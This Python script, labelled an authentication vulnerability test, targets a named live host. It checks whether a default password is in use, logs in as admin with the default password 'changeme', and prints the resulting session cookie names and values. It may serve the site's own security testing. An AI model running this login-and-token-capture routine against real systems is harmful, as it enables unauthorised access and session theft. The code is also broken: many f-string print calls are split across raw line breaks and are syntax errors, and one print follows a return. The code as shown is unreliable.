#!/usr/bin/env python3
"""
Authentication Vulnerability Testing Script
Tests for default password usage and authentication flow
Uses urllib from standard library (no external dependencies)
"""

import urllib.request
import urllib.parse
import urllib.error
import json
import http.cookiejar


def print_response(step: str, url: str, response, data: str):
    """Print formatted response details"""
    print(f"
{'='*60}")
    print(f"STEP: {step}")
    print(f"{'='*60}")
    print(f"URL: {url}")
    print(f"Status Code: {response.status}")
    print(f"Headers:")
    for header, value in response.getheaders():
        print(f"  {header}: {value}")
    
    # Print response body
    print(f"
Response Body:")
    try:
        parsed_data = json.loads(data)
        print(json.dumps(parsed_data, indent=2))
        return parsed_data
    except json.JSONDecodeError:
        print(data)
        return None
    print(f"{'='*60}
")


def main():
    base_url = "https://mesh.yeraze.online"
    
    # Set up cookie jar to maintain session
    cookie_jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
    
    print("Starting Authentication Vulnerability Test")
    print(f"Target: {base_url}")
    
    # Step 1: Check if default password is in use
    print("
[1] Checking for default password usage...")
    try:
        check_url = f"{base_url}/api/auth/check-default-password"
        request = urllib.request.Request(check_url, method='GET')
        
        try:
            response = opener.open(request, timeout=10)
            data = response.read().decode('utf-8')
            parsed_data = print_response("Check Default Password", check_url, response, data)
            
            # Parse response to determine if default password is in use
            default_password_in_use = False
            if parsed_data and isinstance(parsed_data, dict):
                default_password_in_use = (
                    parsed_data.get('defaultPasswordInUse', False) or
                    parsed_data.get('default_password_in_use', False) or
                    parsed_data.get('isDefaultPassword', False) or
                    parsed_data.get('hasDefaultPassword', False)
                )
                print(f"
Default password in use: {default_password_in_use}")
            
            # Print cookies after first request
            print(f"
Cookies after check-default-password:")
            for cookie in cookie_jar:
                print(f"  {cookie.name} = {cookie.value}")
            
            # Step 2: Attempt login if default password appears to be in use
            # or if the endpoint returns a successful response
            if response.status == 200 or default_password_in_use:
                print(f"
[2] Default password check returned status {response.status}.")
                print("Attempting login with default credentials (admin/changeme)...")
                
                login_url = f"{base_url}/api/auth/login"
                login_data = {
                    "username": "admin",
                    "password": "changeme"
                }
                
                json_data = json.dumps(login_data).encode('utf-8')
                login_request = urllib.request.Request(
                    login_url,
                    data=json_data,
                    headers={'Content-Type': 'application/json'},
                    method='POST'
                )
                
                try:
                    login_response = opener.open(login_request, timeout=10)
                    login_response_data = login_response.read().decode('utf-8')
                    print_response("Login Attempt", login_url, login_response, login_response_data)
                    
                    # Print cookies after login
                    print(f"
Cookies after login:")
                    for cookie in cookie_jar:
                        print(f"  {cookie.name} = {cookie.value}")
                    
                    # Step 3: If login successful, retrieve auth status
                    if login_response.status in [200, 201]:
                        print("
[3] Login successful! Retrieving authenticated user status...")
                        
                        status_url = f"{base_url}/api/auth/status"
                        status_request = urllib.request.Request(status_url, method='GET')
                        
                        try:
                            status_response = opener.open(status_request, timeout=10)
                            status_response_data = status_response.read().decode('utf-8')
                            print_response("Auth Status", status_url, status_response, status_response_data)
                            
                            # Print final session cookies
                            print("
[SESSION INFO]")
                            print("Final Session Cookies:")
                            for cookie in cookie_jar:
                                print(f"  Name: {cookie.name}")
                                print(f"  Value: {cookie.value}")
                                print(f"  Domain: {cookie.domain}")
                                print(f"  Path: {cookie.path}")
                                print(f"  Secure: {cookie.secure}")
                                print(f"  HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
                                print()
                        except urllib.error.HTTPError as e:
                            error_data = e.read().decode('utf-8')
                            print(f"HTTP Error {e.code} retrieving auth status: {error_data}")
                    else:
                        print(f"
[3] Login failed. Skipping auth status check.")
                        print(f"Login returned status code: {login_response.status}")
                        
                except urllib.error.HTTPError as e:
                    error_data = e.read().decode('utf-8')
                    print(f"
HTTP Error {e.code} during login:")
                    print(error_data)
                    print("
[3] Login failed. Skipping auth status check.")
            else:
                print(f"
[2] Default password check returned status {response.status}.")
                print("Endpoint suggests default password is not in use or endpoint not available.")
                print("Skipping login attempt.")
                
        except urllib.error.HTTPError as e:
            error_data = e.read().decode('utf-8')
            print(f"
HTTP Error {e.code} checking default password:")
            print(error_data)
            return 1
            
    except urllib.error.URLError as e:
        print(f"
URL Error during request: {e}")
        return 1
    except Exception as e:
        print(f"
Unexpected error: {e}")
        import traceback
        traceback.print_exc()
        return 1
    
    print("
" + "="*60)
    print("Authentication Vulnerability Test Complete")
    print("="*60)
    return 0


if __name__ == "__main__":
    exit(main())
